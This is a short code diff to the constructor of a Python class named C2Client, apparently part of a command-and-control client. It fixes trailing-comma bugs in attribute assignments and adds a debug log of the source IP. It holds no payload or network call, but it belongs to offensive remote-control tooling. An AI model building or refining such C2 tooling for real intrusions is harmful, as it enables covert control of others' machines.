@@ -101,13 +101,14 @@ class C2Client:
             src_ip: str = get_ip_addr(),
             hostname: str = socket.gethostname()
             ):
+        logger.debug(src_ip)
         self.dest_ip = dest_ip
         self.dest_port = dest_port
         self.c2_method = c2_method
         self.endpoint_id = endpoint_id
-        self.sleep = sleep,
-        self.src_ip = src_ip.split("'")[1],
-        self.hostname = hostname,
+        self.sleep = sleep
+        self.src_ip = src_ip
+        self.hostname = hostname
         self.tasking_queue = []
 
     def c2_server_transaction(self, server_message) -> json:
